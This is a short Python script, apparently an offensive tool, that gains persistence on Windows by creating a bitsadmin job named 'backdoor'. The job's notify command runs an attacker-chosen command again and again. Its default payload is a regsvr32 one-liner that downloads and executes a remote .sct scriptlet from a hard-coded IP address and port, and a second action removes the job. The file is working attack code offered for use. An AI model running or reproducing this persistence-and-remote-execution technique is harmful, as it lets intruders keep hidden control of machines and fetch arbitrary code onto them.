#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2020.02.06
# @Author  : Lhaihai
# @File    : bits_jobs
# @Software: PyCharm
# @Blog    : http://www.Lhaihai.top
"""
    Description : 
"""

from logger import factory_logger
logger = factory_logger('bitsadmin')
import subprocess
from func import content_decode
import sys


def add_bitsadmin_cmd(cmd):
    command = r'bitsadmin /create backdoor && bitsadmin /addfile backdoor C:\Windows\System32\calc.exe %temp%\calc.exe && bitsadmin /SetNotifyCmdLine backdoor cmd.exe "cmd.exe /c {}" && bitsadmin /SetMinRetryDelay "backdoor" 60 && bitsadmin /resume backdoor'.format(cmd)
    r = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    rr = content_decode(r.stdout)
    logger.info(rr)

def add_bitsadmin_regsvr32(cmd):
    command = r'bitsadmin /create backdoor && bitsadmin /addfile backdoor C:\Windows\System32\calc.exe %temp%\calc.exe && bitsadmin /SetNotifyCmdLine backdoor {} && bitsadmin /resume backdoor'.format(cmd)
    r = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    rr = content_decode(r.stdout)
    logger.info(rr)

def clear_bitsadmin_cmd():
    command = r'bitsadmin /cancel backdoor'
    r = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    rr = content_decode(r.stdout)
    logger.info(rr)


if __name__ == '__main__':
    tmp = r'regsvr32 /s /n /u /i:http://192.168.190.139:8080/oYfuhgo.sct scrobj.dll'
    action = sys.argv[1] if len(sys.argv) > 1 else ''
    if action == 'set':
        if len(sys.argv) == 3:
            cmd = sys.argv[2]
        else:
            cmd = tmp
        add_bitsadmin_cmd(cmd)
    elif action == 'clear':
        clear_bitsadmin_cmd()
    else:
        print('bitsadmin_64.exe set \'regsvr32 /s /n /u /i:http://192.168.190.139:8080/oYfuhgo.sct scrobj.dll\'')
        print('bitsadmin_64.exe clear')
